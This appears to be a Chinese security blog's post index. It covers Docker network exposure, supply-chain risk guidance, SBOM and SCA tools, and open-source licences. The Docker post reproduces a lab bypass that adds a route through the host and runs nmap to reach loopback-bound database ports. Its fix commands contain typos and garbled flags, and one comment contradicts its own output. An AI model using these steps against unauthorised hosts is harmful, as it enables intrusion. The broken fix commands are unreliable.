关键点写入到响应头中。\n      add_header country-code $geoip2_data_country_code;\n      root $rootpath;\n      index index.html index.htm;\n    &#125;\n  &#125;\n&#125;\n\n\nReferences如何用 Nginx 禁止国外 IP 访问网站Nginx使用geoip2模块并利用MaxMind的GeoIP2数据库实现处理不同国家或城市的访问最佳实践指南\n","slug":"Nginx+GeoIP2","date":"2022-08-10T08:40:59.440Z","categories_index":"开源WAF产品选型","tags_index":"优秀文章收藏,WAF,Nginx,开源WAF产品选型,modsecurity,安全建设,GeoIP","author_index":"Moses"},{"id":"329456693c3fc747f7090ff9cac97881","title":"容器安全-Docker配置安全网络访问控制","content":"Docker配置安全网络访问控制概述和背景Docker 是一个用于开发、发布和运行应用程序的开放平台。Docker 使您能够将应用程序与基础架构分离，以便快速交付软件。在全球范围内，Docker已经得到极大的应用。很多时候，用户并不希望Docker 服务对外开放。因此会通过像 -p 127.0.0.1:80:80这样的参数将端口暴露到回环地址并仅供本地访问，但是由于不恰当的安全配置导致外部攻击者仍然可以访问本地服务。\t\n影响版本\n\n\n\n\n\n\n\n\nDocker &lt;&#x3D; 20.10.5，但是不一定。\n漏洞复现测试环境\ntarget 10.1.82.97\ntarget docker version Docker version 20.10.7, build f0df350\nattack 10.1.82.95\n\n\n查看target docker version[root@tvy-base-worker-03 ~]# docker -v\nDocker version 20.10.7, build f0df350\n创建docker容器并将服务映射到本地略-已有满足测试要求的容器服务# 查看docker暴露服务列表,其中5432和6379绑定本地回环地址\n[root@tvy-base-worker-03 ~]# netstat -nlp |grep docker-proxy|awk &#39;&#123;print $4&#125;&#39;|sort\n0.0.0.0:8000\n0.0.0.0:9000\n127.0.0.1:5432\n127.0.0.1:6379\n# 查看iptables配置\n[root@tvy-base-worker-03 ~]# iptables -nvL DOCKER\nChain DOCKER (2 references)\n pkts bytes target     prot opt in     out     source               destination\n    2    96 ACCEPT     tcp  --  !br-155dee3a3330 br-155dee3a3330  0.0.0.0&#x2F;0            172.21.0.2           tcp dpt:6379\n    2    88 ACCEPT     tcp  --  !br-155dee3a3330 br-155dee3a3330  0.0.0.0&#x2F;0            172.21.0.3           tcp dpt:5432\n 1082 69248 ACCEPT     tcp  --  !br-155dee3a3330 br-155dee3a3330  0.0.0.0&#x2F;0            172.21.0.4           tcp dpt:8000\n  171 10916 ACCEPT     tcp  --  !docker0 docker0  0.0.0.0&#x2F;0            172.17.0.2           tcp dpt:9000\nattack 测试# 未做任何配置，无法访问\n[root@tvy-base-worker-01 ~]# telnet 172.21.0.2 6379\nTrying 172.21.0.2...\nConnected to 172.21.0.2.\nEscape character is &#39;^]&#39;.\n# 添加路由表，可添加网关地址\n[root@tvy-base-worker-01 ~]# ip route add 172.21.0.0&#x2F;24 via 10.1.82.97\n# 扫描容器端口服务\n[root@tvy-base-worker-01 ~]# nmap -p5432 -Pn --open 172.21.0.0&#x2F;24\n\nStarting Nmap 6.40 ( http:&#x2F;&#x2F;nmap.org ) at 2022-08-05 10:22 CST\nNmap scan report for 172.21.0.3\nHost is up (0.00018s latency).\nPORT     STATE SERVICE\n5432&#x2F;tcp open  postgresql\n\nNmap done: 256 IP addresses (256 hosts up) scanned in 4.84 seconds\n[root@tvy-base-worker-01 ~]# nmap -p6379 -Pn --open 172.21.0.0&#x2F;24\n\nStarting Nmap 6.40 ( http:&#x2F;&#x2F;nmap.org ) at 2022-08-05 10:22 CST\nNmap scan report for 172.21.0.2\nHost is up (0.00025s latency).\nPORT     STATE SERVICE\n6379&#x2F;tcp open  unknown\n\nNmap done: 256 IP addresses (256 hosts up) scanned in 4.84 seconds\n# 删除IP route\n[root@tvy-base-worker-01 ~]# ip route del 172.21.0.0&#x2F;24 via 10.1.82.97\n\n漏洞分析默认情况下，Docker deamon会在启动container的时候向iptables中添加转发的规则。它会创建一个filter chain - DOCKER。并且防火墙也没有记录。\nfirewall-cmd --list-port  \nfirewall-cmd --list-service\n\n\ndocke利用这个规则向外暴露container的端口。从上图可见，由于source为0.0.0.0，表示任何ip都可以匹配这条规则，因此也就将这个端口暴露给了全世界。只要外部攻击者通过这台主机将流量发送到 172.21.0.3:5432，就会匹配这条规则并成功访问容器中的postgresql服务，127.0.0.1 并没有什么卵用。\n修复方式官方暂未修复该漏洞，可采取临时修复措施启动daemon的时候使用如下的配置：--iptables=false对于systemd，临时修复方式如下：\nmkdir&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;docker.service.d\ncat &lt;&lt; EOF &gt; &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;docker.service.d&#x2F;noiptables.conf\n[Service]\nExecStart&#x3D;\nExecStart&#x3D;&#x2F;us&#x2F;bin&#x2F;docker daemon -H fd:&#x2F;&#x2F;-- iptables&#x3D;false\nEOF\nsystemctl daemon-reload\n\n对于使用sysvinit和upstart的系统，我们可以修改docker的配置文件&#x2F;etc&#x2F;default&#x2F;docker。\n# 先停止docker  \nsystemcl stop docker  \n# 修改配置   \nvim &#x2F;etc&#x2F;docker&#x2F;daemon.json\n# 如以下内容粘贴进去  \n&#123;  \n&quot;iptables&quot;:false  \n&#125;\n# 保存配置后，重启docker  \nsystemctl restart docker\nReferencesiptables详解及docker的iptables规则_摩洛哥M的博客-CSDN博客_docker iptableshttps://www.jianshu.com/p/69d3ab177655https://mp.weixin.qq.com/s/OwEmhmsnuwsCjqcczPztQAip route命令 - sudochen - 博客园\n","slug":"Docker配置安全网络访问控制","date":"2022-08-05T02:47:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"Docker网络,容器安全","author_index":"Moses"},{"id":"f2412a8bd3bfecd60141b4e2ac30134b","title":"软件供应链安全分析工具-V-Achilles","content":"工具-依赖关系图V-Achilles简介V-Achilles是一个工具，可以显示受软件漏洞攻击影响的直接和间接依赖项的可视化（即使用依赖关系图）。演示地址：Achilles\n4个GitHub存储库的漏洞报告\nsinopia：报告\ncpnmjs：报告\nwindow-build-tool：报告\nnpx：报告\n\n安装指南前端# Local Commands\n\nyarn install yarn start\n\n# Docker commands\n\ndocker-compose up -d --build\n\n# After running commands successfully, the app will be run on http:&#x2F;&#x2F;localhost:3000&#x2F;\n\n后端# Local Commands\n\nyarn install yarn build yarn start\n\n# Docker commands\n\ndocker-compose up -d --build\n\n# After running commands successfully, the app will be run on http:&#x2F;&#x2F;localhost:4000&#x2F;\n","slug":"工具-依赖关系图V-Achilles","date":"2022-08-02T03:17:00.000Z","categories_index":"软件供应链安全","tags_index":"SCA,软件成分分析工具,软件依赖关系图","author_index":"Moses"},{"id":"a83b1803a62789ff520605e269e53d45","title":"软件工程领导者如何降低软件供应链风险","content":"概述和背景调研关键发现共分为以下三点： \n\n恶意代码注入威胁的增加使得保护内部代码和外部依赖项（开源和商业）变得至关重要。 \n软件构建和交付流程受到破坏的后将导致泄露机密或其他敏感数据和代码被篡改。 \n未能强制执行最低权限和扁平化网络架构（对应的是分层网络架构或隔离网络）会使攻击者横向移动到生产环境，从而使企业面临更大的风险。\n\n根据关键发现，调研给出以下建议，软件工程领导者应该与他们的安全和风险管理团队合作，具体分为以下三点：\n\n在整个交付生命周期中，通过强制执行健全的版本控制策略、使用制品库来存储受信任的组件以及管理供应商风险，进而来保护内部和外部代码的完整性。\n通过在 CI&#x2F;CD 中配置安全工具，保护机密以及代码和对容器镜像签名，最终来强化软件交付管道流程。\n通过使用最小特权原则和零信任安全模型来管理资源的访问，保护软件工程师的操作环境。\n\n客户关注的供应链风险维度分为以下三点：\n\nCI&#x2F;CD系统的威胁\n恶意代码注入风险\n包含漏洞和恶意代码的依赖项\n\n\n\n\n\n\n\n\n\n\n从SolarWinds (2020)、NetBeans IDE (2020)、Kaseya (2021) 和 Codecov (2021)代表软件供应链攻击的这四个突出示例来看。Gartner 认为，到 2025 年，全球 45% 的组织将受到软件供应链遭受攻击，比 2021 年增加了三倍。\n潜在软件供应链风险软件供应链攻击是在软件开发、交付和使用的任何阶段破坏软件或其依赖项之一的行为。 尽管每种情况下精确的攻击向量可能不同，但攻击者通常会未授权访问开发环境和基础设施，包括版本控制系统、制品仓库、开源软件存储库、持续集成管道、构建服务器或应用程序服务器等，这导致攻击者可以通过修改源代码、脚本和依赖软件包，并建立后门窃取受害者环境中的数据。攻击包括但不仅限于外部攻击者，也可能来自内部威胁。\n内部和外部代码风险（开源组件）开发阶段\n证书丢失\n密钥硬编码\n密钥丢失\n弱加密\n代码注入\n固件串改\n\n集成阶段\n开源组件漏洞\n包名抢注\n命名空间冲突\n不安全的第三方SDK和API\n\n交付流程风险\n签名证书被篡改\n自动化脚本被篡改\n\n生产环境风险\n未授权访问\n二进制代码逆向\n表单劫持\n提权\n网络端口扫描\n更新劫持\n\n软件开发和部署中降低供应链安全风险的最佳安全开发实践针对这三类风险，Gartner给出了部分应对措施和建议。\n内部和外部代码风险应对措施软件研发团队使用版本控制系统（git&#x2F;svn等）和制品库来维护内部代码开发和外部制品分发，如果未将这些版本控制系统和制品库进行安全控制，可导致源代码和组件被篡改或劫持。Garter推荐以下三种方式来保障代码和组件的完整性。\n\n严格的版本控制\n受信任的组件库\n第三方风险管理\n\n严格的版本控制基于 Git 的版本管理系统（VCS），包括 BitBucket、GitHub 和 GitLab，提供源代码托管和访问权限控制能力，软件工程团队必须启用访问策略控制、分支保护和敏感扫描功能。 这些控件策略默认情况下不启用，必须进行配置。由于部分研发人员安全意思孱弱，无意将密钥信息，证书等上传到github或者gitlab上，任何能访问到源代码的用户均可获取相关敏感信息,Garter推荐部分基于Git存储库的敏感信息扫描工具。\n\n\n\n开源工具\n厂商\n\n\n\ngit-secrets: Open sourced by AWS Labs\nGithub Secrets Scanning\n\n\nRepo Supervisor: Open sourced by Auth0\nGitLab Secret Detection\n\n\ntruffleHog: Searches for secrets in Git repos\nBitbuchet Secrets Scan\n\n\nGitleaks: Scans repos and commits for secrets\nGitGuardian\n\n\nDeadshot: Open sourced by Twilio\nSpectralOps\n\n\n受信任的组件库建议使用制品（或容器镜像）存储库、软件成分分析工具和源代码扫描工具，其中制品存储库可以对组件进行分发版本控制，软件成分分析工具（SCA）可以对当前组件及源代码进行成分分析，获取项目的依赖风险信息，并及时进行升级修复，对于源代码扫描工具(SAST)，可以对用户自己编写的源代码进行合规和安全行分析。常见的制品库管理工具如下：\n\n\n\n组件管理平台\n容器管理平台\n\n\n\nAzure Artifacts\nAzure Container Registry\n\n\nAWS CodeArtifacts\nAmazon ECR\n\n\nGitHub\nCNCF Harbor\n\n\nGitLab\nDocker Trusted Registry\n\n\nGoogle Artifact Registry\nGitHub\n\n\nJFrog Artifactory\nGitLab\n\n\nSonatype Nexus Repository\nGoogle Container Registry\n\n\nTidelift Catalogs\nJFrog Artifactory\n\n\nRed Hat Quay\n\n\n\n常用企业级的SAST工具如下：\n\n\n\n工具名称\n类型\n公司\n地址\n\n\n\nFortify sca\n商业\nHp Security\nhttps://www.microfocus.com/zh-cn/products/static-code-analysis-sast/overview\n\n\ncheckmarx sast\n商业\ncheckmarx\nhttps://checkmarx.com/product/cxsast-source-code-scanning/\n\n\nSonarqube\n开源\nSonaqube\nhttps://www.sonarqube.org/\n\n\nVeracode Static Analysis (SAST)\n商业\nVeracode\nhttps://www.veracode.com/products/binary-static-analysis-sast\n\n\nCoverity\n商业\nsynopsys\nhttps://www.synopsys.com/software-integrity/security-testing/static-analysis-sast.html\n\n\n奇安信代码卫士\n商业\nqax\nhttps://www.qianxin.com/product/detail/pid/14\n\n\nDMSCA\n商业\n端玛科技\nhttp://www.dumasecurity.com/goods.html\n\n\nAppScan Source\n商业\nHCL AppScan\nhttps://www.hcltechsw.com/appscan/offerings/source\n\n\n常用企业级SCA工具：\n\n\n\n工具名称\n类型\n公司\n地址\n\n\n\nBlack Duck Software Composition Analysis\n商业\nsynopsys\nhttps://www.synopsys.com/software-integrity/security-testing/software-composition-analysis.html\n\n\nnexus lifecycle\n商业\nSonatype\nhttps://www.sonatype.com/products/open-source-security-dependency-management?topnav=true\n\n\nVeracode sca\n商业\nVeracode\nhttps://www.veracode.com/products/software-composition-analysis\n\n\nJfrog Xray\n商业\nJfrog\nhttps://jfrog.com/xray/\n\n\nMend sca\n商业\nMend\nhttps://www.mend.io/sca/\n\n\ncheckmarx sca\n商业\nCheckmarx\nhttps://checkmarx.com/product/cxsca-open-source-scanning/\n\n\nDependency Scanning\n商业\nGitlab\nhttps://docs.gitlab.com/ee/user/application_security/dependency_scanning/\n\n\nDependency Track\n开源\nOwasp\nhttps://dependencytrack.org/\n\n\n雳鉴SCA\n商业\n默安\nhttps://www.moresec.cn/product/sdl-sca\n\n\n悬镜源鉴OSS\n商业\n悬镜\nhttps://oss.xmirror.cn/\n\n\nCoBot\n商业\n北大库博\nhttps://www.pkuse.com.cn/multi/521.html\n\n\nThe Forrester Wave SCA\n\n\n\n\n\n\n\n\n\n\n\nTOP 10 SCA工具中有5款支持软件包开源软件SCA检查能力(synopsys&#x2F; Sonatype&#x2F; Veracode&#x2F; Jfrog&#x2F; GitLab)，其他工具只支持源代码SCA检查能力。5款支持软件包SCA检查工具中，对C&#x2F;C++、Java、.Net语言支持的比较好，但对Golang、python、JavaScript语言支持能力偏弱，比如：synopsys支持的组件对象中前面3种语言占大头90%+，相应的检测率也高，而Golang语言的组件检出率则低很多。\n第三方风险管理常见的与第三方软件相关的两种供应链风险：\n\n由于第三方或开源依赖项中的已知漏洞而导致的风险\n由于外部采购软件中植入后门&#x2F;恶意软件的风险\n\nGarter提供的解决措施：\n\n检查第三方是否遵循标准或获得认证\n检查供应商是否有必要的措施开展SDLC流程\n供应商遵循什么流程来修补自己的软件及其依赖项\n第三方软件的更新机制是否受到保护\n对于第三方软件或依赖项中发现的漏洞的SLA（软件服务协议）是什么？\n\n软件供应链安全评估框架和标准\n\n\n\n评估名称\n简介\n地址\n\n\n\nEvaluating Your Supply Chain Security\nA Checklist by Cloud Native Computing Foundation (CNCF)\nhttps://github.com/cncf/tag-security/blob/main/supply-chain-security/supply-chain-security-paper/secure-supply-chain-assessment.md\n\n\nNIST Secure Software Development Framework\nSecure Software Development Framework (SSDF) Version 1.1:Recommendations for Mitigating the Risk of SoftwareVulnerabilities\nhttps://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf\n\n\nNIST, Security and Privacy Controls for Information Systems and Organizations\nSecurity and Privacy Controls.\nhttps://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf\n\n\nUl 2900 for IoT Certification\nUL 2900 series of standards was developed as part of UL’s Cybersecurity Assurance Program which provides manufacturers testable and measureable criteria\nhttps://www.cybersecuritysummit.org/wp-content/uploads/2017/10/4.00-Justin-Heyl.pdf\n\n\nISO&#x2F;IEC 27034\nInformation technology — Security techniques — Application security\nhttps://www.iso.org/standard/44378.html\n\n\n软件供应链开源项目安全评估\n\n\n\n评估名称\n简介\n地址\n\n\n\nOpen Source Insights\nOpen Source Insights 会展示软件包的相关信息，而无需用户预先安装软件包。开发人员可以看到该依赖包对项目的重要程度，依赖组件流行程度，查找源代码的链接，然后决定是否应安装该组件。\nhttps://opensource.googleblog.com/2021/06/introducing-open-source-insights-project.html\n\n\nOSSF Scorecard\nOSSF Scorecard 是一个通过多种维度来评估开源项目的安全性的工具.\nhttps://github.com/ossf/scorecard\n\n\nSupply chain Levels for Software Artifacts (SLSA, pronounced “salsa”)\n确保软件供应链中组件完整性的端到端保护框架。\nhttps://security.googleblog.com/2021/06/introducing-slsa-end-to-end-framework.html\n\n\n交付流程风险应对措施1. 使用密钥管理工具:密钥管理通过规范的方法来管理和保护如凭证、密码、API 令牌和证书等机密。 Garter建议使用密钥管理工具来自动创建、存储、检索和撤销秘密。 这有助于避免在源代码、配置文件和基础设施自动化脚本中嵌入（硬编码）密钥信息等。常见的密钥管理工具如下：\n\n\n\n场景\n密钥管理工具\n\n\n\n与平台无关\nAkeyless\n\n\nCyberArk Conjur\n\n\n\nThycotic Secrets Vault\n\n\n\nHashiCorp Vault\n\n\n\n云厂商提供\nAWS Secrets Manager\n\n\nAzure Key Vault\n\n\n\nGCP Secret Manager\n\n\n\n容器原生环境\nKubernetes Secrets (etcd)\n\n\nSealed Secrets\n\n\n\n配置管理\nAnsible Vault\n\n\nChef Data Bag\n\n\n\nPuppet Hiera\n\n\n\n2. 通过签名和散列函数来验证源码的完整性\n哈希和签名可用于验证源代码和二进制文件的完整性。VCS（版本控制系统）在提交时会对单个文件生成哈希，该哈希可以用于验证文件在传输过程中是否被篡改。另外，编译器在编译时也生成哈希，可以通过将提交时和编译时的哈希进行对比，以保证代码在提交阶段和编译阶段未被篡改。\n\n提交签名由于哈希不能验证来源，所以需要通过VCS的签名提交功能来验证提交代码人的身份。\n\n容器签名当前越来越多的系统开始通过容器进行部署，因此需要保证容器未被篡改过。即使用户的公司或组织自行构建和维护内部镜像，Gartner 也建议对容器镜像进行签名。这是因为第三方代码或依赖项中的任何问题都会影响正在运行的应用程序的安全状况\n\n容器签名的工具如下：\n\n\n\n\n\n工具名称\n介绍\n地址\n\n\n\nGrafeas\nGrafeas定义用于管理有关软件资源的元数据的API格式，例如容器镜像，VM镜像，JAR包和脚本，为构建代码到容器供应链的组件，包括组件的来源、漏洞、依赖关系等提供了一个集中的知识库。\nhttps://github.com/grafeas/grafeas\n\n\nKritis\nKritis 是一个Kubernetes准入控制器，它在运行时运行由Kubernetes集群管理员定义的策略检查，然后根据镜像中的漏洞或镜像不是从可信来源获得的，批准或拒绝要启动的容器。\nhttps://github.com/grafeas/kritis\n\n\nKritis Singer\n是一个为容器图像创建认证的命令行工具。\nhttps://github.com/grafeas/kritis/blob/master/docs/signer.md\n\n\nCosign\nCosign对容器图像签名。Cosign是由Linux基金会主办的sigstore项目的一部分。\nhttps://github.com/sigstore/cosign\n\n\n3. 在CI&#x2F;CD管道中配置安全控制攻击者可以通过攻击CI&#x2F;CD系统来绕过对代码的检查和扫描，因此需要保证CI&#x2F;CD系统的安全性。可以通过对CI&#x2F;CD系统的安全配置来防范风险。常见工具：Apiiro, Argon,Cycode, Garantir, GrammaTech, JFrog (Vdoo)、RunSafe Security。保护 CI&#x2F;CD 管道有以下两点措施： \n\n可复现的构建过程确保相同的代码始终构建相同的软件，其中包含以下三点原则： \n确定性构建：确保相同的源代码必须编译构建相同的软件强化构建工具：构建管道中的工具是安全稳定的且不可更改的可验证输出：能够检测和验证预期构建和实际构建之间的差异 \n\n在构建管道中创建不可变的、可验证的制品签名任务支持在管道运行期间生成制品的签名，以确保一致性并在管道执行结束时验证出处。\n\n\n对于IDE的保护，可以使用基于浏览器的IDE（远程开发桌面），防止开发人员本地安装的IDE工具存在风险。\n生产环境风险应对措施操作环境风险是指在整个软件开发过程中所涉及的操作环境的风险，如开发环境、代码仓库、流水线系统、测试环境等。针对操作环境的风险防范措施包括：\t\n1. 最小权限访问策略网络上连接着不同设备，特权提升允许攻击者一旦获得对一个系统的访问，就可以渗透到其他机器和服务中。此外，除非实施了正确的访问控制，否则受到攻击的可执行文件可能会未经授权与其他核心系统建立连接。因此，Garter建议使用基于角色的身份验证和授权、使用零信任安全模型的自适应访问和特权访问管理。\n2. 机器身份管理对分布式应用、云原生、API服务等架构体系的使用使得应用系统的部署变得更细颗粒度且数量增多。机器身份管理是对主机、容器、虚拟机、应用程序、数据库、API服务等机器的身份进行统一管理、统一验证，确定机器的唯一身份。包括：密钥管理、证书管理等。常见的机器身份识别系统如下：\n\n\n\n使用场景\n作用域\n应用名称\n\n\n\n静态数据加密，对称密钥管理\n密钥管理系统\nAkeyless\n\n\n\n\nAWS\n\n\n\n\nKMS\n\n\n\n\nAzure\n\n\n\n\nTwilio (Ionic)\n\n\n\n\nFortanix\n\n\n\n\nPKWARE\n\n\n\n\nThales and Townsend Security\n\n\n存储DevOps管道中使用的密钥，将机器标识发送给容器\n机密管理\nAkeyless\n\n\n\n\nAWS\n\n\n\n\nMicrosoft Azure\n\n\n\n\nBeyondTrust\n\n\n\n\nCyberArk\n\n\n\n\nFortanix\n\n\n\n\nGoogle Cloud Platform (GCP)\n\n\n\n\nHashiCorp\n\n\n\n\nThycoticCentrify\n\n\n用于代码签名的身份验证、加密和签名\nPKI和证书管理\nAppViewX\n\n\n\n\nAWS\n\n\n\n\nDigiCert\n\n\n\n\nEntrust\n\n\n\n\nGlobalSign\n\n\n\n\nKeyfactor\n\n\n\n\nMicrosoft\n\n\n\n\nThe Nexus Group\n\n\n\n\nSectigo\n\n\n\n\nVenafi\n\n\n发现和控制对关键系统的特权访问\n特权访问管理\nAkeyless\n\n\n\n\nBeyondTrust\n\n\n\n\nBroadcom\n\n\n\n\nCyberArk\n\n\n\n\nOne Identity\n\n\n\n\nThycoticCentrify\n\n\n3. 异常检测和自动响应软件工程领导者必须与安全和风险团队密切合作，以了解和定义其开发平台和工具的预期行为，以便他们能够实时检测异常。 例如，EDR、CWPP、NDR 或 squery 等工具可以监控系统异常。 构建系统，包括软件工程师使用的 PC，不应免除 EPP&#x2F;EDR 保护。异常检测和响应在容器原生、基于 GitOps 的部署中尤其重要，可以自动化部署完整的代码到容器工作流程。 尽管处于开发阶段的容器镜像扫描工具有助于检测已知漏洞，但软件工程团队必须部署相关工具来可视化容器流量、识别集群错误配置并对异常容器行为和安全事件进行监测。对异常活动进行监测，并及时响应和处理有以下四点：\n\n\n可执行文件与访问控制系统创建不必要的连接\n\n\n\n特定机器上的进程、线程以及CPU和内存的利用率增加\n\n\n\n针对网络访问、存储库的上传及下载、非常用目录的流访问量激增\n\n\n\n监控软件的异常告警（SIEM、EPP、CASB）\n\n\n\n总结从SolarWinds (2020)、NetBeans IDE (2020)、Kaseya (2021) 和 Codecov (2021)攻击案例来看，软件供应链安全攻击范围较广，难度较高，周期较长，影响较远，防护较弱。根据信息安全的“木桶理论”：“信息的安全就像一个‘木桶’，整体的安全性取决于最薄弱的一个环节，否则即使其它方面做得再强，但在某一方面留下一个漏洞，也可能被他人利用，导致信息的失窃。”供应链当前安全现状也如此。为了提升软件供应链安全，建议软件工程团队根据自身情况，循序渐进提升软件供应链安全能力。\nReferences\nhttps://www.gartner.com/en/documents/4003625【How Software Engineering Leaders Can Mitigate Software Supply Chain Security Risks】\nhttps://cloud.tencent.com/developer/article/1839537【企业级静态代码分析工具清单】\nhttps://www.gartner.com/reviews/market/software-composition-analysis-sca【Products In Software Composition Analysis (SCA) reviews Market】\nhttps://sudonull.com/post/27911-Forrester-Research-A-Comparison-of-Ten-Top-Software-Composition-Analysis-Vendors【Forrester Research: A Comparison of Ten Top Software Composition Analysis Vendors】\nhttps://blog.csdn.net/m0_50579386&#x2F;article&#x2F;details&#x2F;123507873【国内外软件成分分析SCA产品评测】\nhttps://developer.aliyun.com/article/738408【Kubernetes 时代的安全软件供应链】\n\n","slug":"Gartner-《软件工程领导者如何降低软件供应链风险》分享","date":"2022-07-25T05:18:00.000Z","categories_index":"软件供应链安全","tags_index":"软件供应链风险,优秀文章收藏","author_index":"Moses"},{"id":"67dd0e8e72f6ddd8ae2e7ba7f339b055","title":"软件材料清单生成工具-微软","content":"微软开源其软件材料清单（SBOM）生成工具0x01简介2022年7月12日微软开源了原件材料清单生成工具，该工具适用于Windows、Linux和Mac等跨平台，并使用标准软件包数据交换（SPDX）格式。（要查看之前关于我们SBOM工具的公告，请阅读微软使用SPDX生成软件材料清单（SBOM）。）\n很容易地集成到并自动检测NPM、NuGet、PyPI、CocoaPods、Maven、Golang、Rust Crates、RubyGems、容器中的Linux软件包、Gradle、Ivy、GitHub公共存储库等。随着我们在组件检测中添加更多检测器，它也将改进我们的SBOM工具。\n0x02SPDX规范SBOM包含基于SPDX规范的四个主要部分：\n\n文档创建信息：有关SBOM文档的一般信息，例如软件名称、SPDX许可证、SPDX版本、创建文档的人、创建时间等。\n文件部分：构成软件的文件列表。每个文件都有一些属性，包括其内容的散列（SHA-1、SHA-256）。\n软件包部分：构建软件时使用的软件包列表。每个软件包都有其他属性，如名称、版本、供应商、散列（SHA-1、SHA-256）和软件包URL（紫色）软件标识符。\n关系部分：SBOM不同元素（如文件和软件包）之间的关系列表。\n\n它还可以参考其他SBOM文档来捕获完整的依赖树。这是包含SBOM文档的依赖引用的重要功能，或用于后续构建的前身构建的SBOM文档，如下所示。由此产生的SBOM文档引用被添加到_文档创建信息_部分，示例如下所示。\n&quot;externalDocumentRefs&quot;: [\n\n&#123;\n\n&quot;externalDocumentId&quot;: &quot;DocumentRef-Demo-861-71558f43fca51a285338834fb9b3c7c14a78cd77&quot;,\n\n&quot;spdxDocument&quot;: &quot;https:&#x2F;&#x2F;sbom.microsoft&#x2F;1:VF6zo7ndBEakT2mCbPwGug:j5h1PLm-TkijVnfDJD_CCA&#x2F;7:861&#x2F;MMerAxYfQkOTN4dWqqlV-A&quot;,\n\n&quot;checksum&quot;: &#123;\n\n&quot;算法&quot;: &quot;SHA1&quot;,\n\n校验和值：71558f43fca51a285338834fb9b3c7c14a78cd77“&#125;&#125;，\n0x03下载安装\nLinuxcurl -Lo sbom-tool https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;sbom-tool&#x2F;releases&#x2F;latest&#x2F;download&#x2F;sbom-tool-linux-x64\nchmod +x sbom-tool\nwindowsInvoke-WebRequest -Uri &quot;https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;sbom-tool&#x2F;releases&#x2F;latest&#x2F;download&#x2F;sbom-tool-win-x64.exe&quot; -OutFile &quot;sbom-tool.exe&quot;\nmacoscurl -Lo sbom-tool https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;sbom-tool&#x2F;releases&#x2F;latest&#x2F;download&#x2F;sbom-tool-osx-x64\nchmod +x sbom-tool\n\n0x04Usagegenerate -b &lt;drop path&gt; -bc &lt;build components path&gt; -pn &lt;package name&gt; -pv &lt;package version&gt; -nsb &lt;namespace uri base&gt;\n详细参数sbom-tool&#x2F;sbom-tool-arguments.md at main · microsoft&#x2F;sbom-tool · GitHub\nReferencesClause 6: Document Creation Information - specification v2.2.2Microsoft open sources its software bill of materials (SBOM) generation tool - Engineering@Microsoft\n","slug":"微软开源其软件材料清单（SBOM）生成工具","date":"2022-07-22T01:14:00.000Z","categories_index":"软件供应链安全","tags_index":"SBOM,工具","author_index":"Moses"},{"id":"b7081b396c4538900c4bf192cfa3bd50","title":"Java供应链（依赖）安全检测实践","content":"☁️简介略-见链接\n🔗链接\nJava 供应链(依赖)安全检测实践\n软件成分安全分析（SCA）能力的建设与演进\n\n🤔感悟\n在 SDL 流程中，通过消息来调度各安全能力，上图以数字编号描述了构建阶段的增量扫描流程和包含了 SCA 辅助 SAST 判断依赖漏洞可利用性的 SAST 扫描流程，以字母编号描述了运行阶段的存量扫描流程。构建阶段，SCA 扫描由工程构建完成消息触发，数据流 mavenTree 的输入由 SCA 从 SDL 获取，完成扫描后返回漏洞信息给 SDL，SCA 的可利用性检查能力通过和 SAST 之间自建的消息队列异步提供给 SAST。运行阶段，SCA 扫描由资产库更新的消息触发，SCA 从资产库查询 Jar 包的 maven 坐标检测漏洞，检测之后输出给 SDL。\n🏈行动略\n","slug":"Java 供应链(依赖)安全检测实践","date":"2022-07-12T09:50:01.631Z","categories_index":"软件供应链安全","tags_index":"优秀文章收藏,SCA,JAVA","author_index":"Moses"},{"id":"bcfb0bc31886c6fac8f776ffee8c1943","title":"开源软件治理-开源软件引入风险及管控举措","content":"☁️简介见链接\n🔗链接浅谈敏捷开发模式下银行业金融机构开源软件引入风险及管控举措 – 安全村SPDX License List | Software Package Data Exchange (SPDX)\n🤔感悟\n\n🏈行动开源许可证Apache\nApache许可证(Apache License)，是一个在Apache软件基金会发布的自由软件许可证，最初为Apache http服务器而撰写。Apache许可证要求被授权者保留版权和放弃权利的申明，但它不是一个反版权的许可证。\n当前版本 Apache License, Version 2.0\n\nMIT\nMIT许可证之名源自麻省理工学院（Massachusetts Institute of Technology, MIT），又称“X条款”（X License）或“X11条款”（X11 License）。\nMIT是和BSD一样宽范的许可协议，作者只想保留版权,而无任何其他了限制。也就是说，你必须在你的发行版里包含原许可协议的声明，无论你是以二进制发布的还是以源代码发布的。\n当前版本 The MIT License\n\nISC\nISC许可证是一种开放源代码许可证，在功能上与两句版的BSD许可证相同。\n这份许可证是由ISC（Internet Systems Consortium）所发明，在ISC释出软件时所使用的。\n当前版本 ISC License (ISC)\n\nBSD\nBSD开源协议（original BSD license、FreeBSD license、Original BSD license）是一个给于使用者很大自由的协议，BSD 代码鼓励代码共享，但需要尊重代码作者的著作权。\nBSD由于允许使用者修改和重新发布代码，也允许使用或在BSD代码上开发商业软件发布和销售，因此是对商业集成很友好的协议。\n当前版本 The 2-Clause BSD License\n\nGPL\nGPL，是GNU General Public License的缩写，是GNU通用公共授权非正式的中文翻译。它并非由自由软件基金会所发表，亦非使用GNU通用公共授权的软件的法定发布条款\n只有GNU通用公共授权英文原文的版本始具有此等效力。\n当前版本 GNU General Public License\n\nMozilla\nMPL是The Mozilla Public License的简写，是1998年初Netscape的 Mozilla小组为其开源软件项目设计的软件许可证。\nMPL许可证出现的最重要原因就是，Netscape公司认为GPL许可证没有很好地平衡开发者对 源代码的需求和他们利用源代码获得的利益。\n当前版本 Mozilla Public License\n\nLGPL\nLGPL是 GNU Lesser General Public License (GNU 宽通用公共许可证)的缩写形式，旧称GNU Library General Public License (GNU 库通用公共许可证),后来改称作Lesser GPL，即为更宽松的GPL，在宽松程度上与BSD, Apache,XFree86 许可证相似。\n当前版本 Lesser General Public License\n\n\n\n\n\n\n\n\n\n\n中国是国际版权公约成员国，中国法律规定了协议及合同，开源协议是受合同法保护的。\n许可证分类\nCopyleftWhat is copyleft? | Opensource.comCopeleft又分为强（strong）或弱（weak）两种类型。二者的区别在于有多少新代码或相邻码受到copyleft 